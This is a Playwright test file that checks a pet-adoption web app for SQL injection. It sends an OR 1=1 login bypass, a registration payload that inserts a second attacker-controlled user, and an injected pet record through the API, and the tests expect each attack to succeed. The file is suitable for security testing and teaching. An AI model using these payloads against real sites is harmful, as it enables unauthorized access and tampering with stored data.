const { test, expect } = require('@playwright/test');

test.describe('SQL Injection Vulnerability Tests', () => {

  // ==========================================
  // LOGIN SQL INJECTION TESTS
  // ==========================================

  test('Login - SQL injection bypass with OR 1=1', async ({ page }) => {
    await page.goto('/login.html');

    // Attempt SQL injection
    await page.fill('input[name="username"]', "' OR 1=1--");
    await page.fill('input[name="password"]', 'anything');
    await page.click('button[type="submit"]');

    // Should successfully bypass login
    await page.waitForURL('/', { timeout: 5000 });

    // Verify we're logged in
    const welcomeText = await page.textContent('body');
    expect(welcomeText).toContain('Pets');
  });

  // ==========================================
  // REGISTER SQL INJECTION TESTS
  // ==========================================

  test('Register - SQL injection creates two users', async ({ page, request }) => {
    const timestamp = Date.now();

    // Register with SQL injection payload through UI
    await page.goto('/register.html');

    // Payload: Create two users at once
    const maliciousUsername = `user${timestamp}', 'pass1'), ('hacked${timestamp}', 'pass2');--`;

    await page.fill('input[name="username"]', maliciousUsername);
    await page.fill('input[name="email"]', 'test@example.com');
    await page.fill('input[name="password"]', 'ignored');
    await page.fill('input[name="confirmPassword"]', 'ignored');
    await page.click('button[type="submit"]');

    // Wait for registration to complete
    await page.waitForTimeout(2000);

    // Now try to login with the second (injected) user through UI
    await page.goto('/login.html');
    await page.fill('input[name="username"]', `hacked${timestamp}`);
    await page.fill('input[name="password"]', 'pass2');
    await page.click('button[type="submit"]');

    // If we can login, SQL injection worked
    await page.waitForURL('/', { timeout: 5000 });

    // Verify we're logged in
    const welcomeText = await page.textContent('body');
    expect(welcomeText).toContain('Pets');
  });

  // ==========================================
  // ADD PET SQL INJECTION TEST
  // ==========================================

  test('Add Pet - SQL injection in pet name', async ({ page, request }) => {
    const timestamp = Date.now();

    const response = await request.post('/api/pets', {
      data: {
        name: `TestPet${timestamp}', 'cat', 5, 'https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba', 'Injected pet via SQL', 1);--`,
        type: 'ignored',
        age: 0,
        image_url: 'ignored',
        description: 'ignored'
      }
    });

    // Should process the injection (success or error)
    expect([200, 500].includes(response.status())).toBeTruthy();
  });
});